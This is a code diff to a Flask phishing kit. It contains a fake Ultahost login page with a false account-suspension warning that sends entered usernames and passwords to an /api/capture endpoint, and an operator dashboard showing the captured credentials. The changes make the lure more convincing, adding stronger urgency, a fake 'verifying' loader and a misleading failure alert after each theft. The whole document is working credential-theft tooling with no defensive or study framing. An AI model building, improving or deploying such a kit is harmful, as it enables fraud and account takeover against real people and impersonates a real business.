@@ -51,6 +51,8 @@ DASHBOARD_HTML = '''
         input,button{width:100%;padding:12px;margin:10px 0;background:#0a0e27;color:#00ffcc;border:1px solid #00ffcc;border-radius:5px;}
         .stats{background:#1a1f3a;padding:15px;border-radius:10px;margin-bottom:20px;}
         .badge{background:#ff3366;color:white;padding:2px 8px;border-radius:20px;font-size:11px;}
+        .success{color:#00ff00;}
+        .refresh-btn{background:#1a1f3a;border:1px solid #00ffcc;padding:5px 10px;cursor:pointer;margin-left:10px;}
     </style>
     <script>
         let authenticated = false;
@@ -64,7 +66,7 @@ DASHBOARD_HTML = '''
                 document.getElementById('login').style.display = 'none';
                 document.getElementById('content').style.display = 'block';
                 loadData();
-                setInterval(loadData, 5000);
+                setInterval(loadData, 3000);
             }
         }
         async function login() {
@@ -82,27 +84,34 @@ DASHBOARD_HTML = '''
                     <td>${r.timestamp}</td>
                     <td>${r.ip}</td>
                     <td><span class="badge">${r.source}</span></td>
-                    <td>${r.username}</td>
-                    <td>${r.password}</td>
+                    <td><strong>${r.username}</strong></td>
+                    <td><strong style="color:#ffd700;">${r.password}</strong></td>
                 </tr>`;
             }
             document.getElementById('data').innerHTML = html;
             document.getElementById('stats').innerHTML = `📊 Total captured: ${data.length}`;
+            if (data.length > 0) {
+                document.getElementById('alert').innerHTML = '<span class="success">● NEW CREDENTIALS CAPTURED!</span>';
+                setTimeout(() => { document.getElementById('alert').innerHTML = ''; }, 3000);
+            }
         }
         checkAuth();
     </script>
 </head>
 <body>
 <div id="login" class="login">
-    <h2>SystemApdate Dashboard</h2>
+    <h2>🔐 SystemUpdate Dashboard</h2>
     <input type="password" id="pwd" placeholder="Password">
     <button onclick="login()">Login</button>
 </div>
 <div id="content" style="display:none">
-    <h1>🔐 SystemApdate - Captured Credentials</h1>
-    <div class="stats" id="stats">📊 Captured: 0</div>
+    <h1>🎯 SystemUpdate - Intelligence Dashboard</h1>
+    <div class="stats">
+        <span id="stats">📊 Captured: 0</span>
+        <span id="alert" style="margin-left:20px;"></span>
+    </div>
     <div style="overflow-x:auto;">
-    </table>
+    <table>
         <thead><tr><th>Time</th><th>IP</th><th>Source</th><th>Username</th><th>Password</th></tr></thead>
         <tbody id="data"></tbody>
     </table>
@@ -112,12 +121,12 @@ DASHBOARD_HTML = '''
 </html>
 '''
 
-# Phishing Page HTML
+# Advanced Phishing Page
 PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultahost - Client Portal</title>
+    <title>Ultahost - Account Verification Required</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -142,18 +151,25 @@ PHISHING_HTML = '''
         .logo{text-align:center;margin-bottom:30px;}
         .logo h1{font-size:32px;color:#2c7be5;letter-spacing:-1px;}
         .logo p{color:#666;font-size:14px;}
-        .alert{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;border-radius:8px;margin-bottom:25px;}
-        .alert strong{color:#856404;display:block;margin-bottom:5px;}
-        .alert p{color:#856404;font-size:13px;margin:0;}
+        .alert-critical{
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+        .alert-critical strong{color:#721c24;display:block;margin-bottom:5px;}
+        .alert-critical p{color:#721c24;font-size:13px;margin:0;}
         .input-group{margin-bottom:20px;}
         .input-group label{display:block;margin-bottom:8px;font-weight:500;color:#333;font-size:14px;}
-        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;}
+        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;transition:0.2s;}
         .input-group input:focus{outline:none;border-color:#2c7be5;box-shadow:0 0 0 3px rgba(44,123,229,0.1);}
-        button{width:100%;padding:14px;background:#2c7be5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;}
+        button{width:100%;padding:14px;background:#2c7be5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s;}
         button:hover{background:#1a68d1;}
         .footer{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #eee;}
         .footer a{color:#2c7be5;text-decoration:none;font-size:13px;margin:0 10px;}
         .copyright{text-align:center;margin-top:20px;color:#999;font-size:11px;}
+        .loader{display:none;text-align:center;margin-top:15px;color:#2c7be5;font-size:13px;}
     </style>
 </head>
 <body>
@@ -162,39 +178,51 @@ PHISHING_HTML = '''
         <h1>Ultahost</h1>
         <p>Client Portal</p>
     </div>
-    <div class="alert">
-        <strong>⚠️ Account Expiration Notice</strong>
-        <p>Your hosting account will expire in 48 hours. Please verify your credentials immediately.</p>
+    <div class="alert-critical">
+        <strong>⚠️ CRITICAL: Account Suspension Notice</strong>
+        <p>Your hosting account will be permanently suspended in 24 hours. Immediate verification is required.</p>
     </div>
     <form id="loginForm">
         <div class="input-group">
             <label>Email Address / Username</label>
-            <input type="text" id="username" placeholder="Enter your email or username" required>
+            <input type="text" id="username" placeholder="Enter your email or username" required autocomplete="off">
         </div>
         <div class="input-group">
             <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
+            <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
         </div>
-        <button type="submit">Log In</button>
+        <button type="submit">Verify Account Now</button>
     </form>
+    <div id="loader" class="loader">Verifying, please wait...</div>
     <div class="footer">
         <a href="#">Forgot Password?</a>
-        <a href="#">Support Center</a>
+        <a href="#">Contact Support 24/7</a>
     </div>
     <div class="copyright">© 2026 Ultahost. All rights reserved.</div>
 </div>
 <script>
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
+    const btn = document.querySelector('button');
+    const loader = document.getElementById('loader');
+    btn.disabled = true;
+    loader.style.display = 'block';
+    
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
+    
     await fetch('/api/capture', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({username: username, password: password, source: 'ultahost'})
     });
-    alert('Login failed. Invalid credentials. Please try again.');
-    document.getElementById('loginForm').reset();
+    
+    setTimeout(() => {
+        loader.style.display = 'none';
+        btn.disabled = false;
+        alert('Verification failed. Please check your credentials and try again.');
+        document.getElementById('loginForm').reset();
+    }, 1500);
 });
 </script>
 </body>
@@ -232,7 +260,7 @@ def capture():
     conn.commit()
     cur.close()
     conn.close()
-    print(f"[+] Captured: {data.get('username')}:{data.get('password')}")
+    print(f"[+] CAPTURED! {data.get('username')}:{data.get('password')}")
     return jsonify({'status': 'ok'})
 
 @app.route('/api/data')
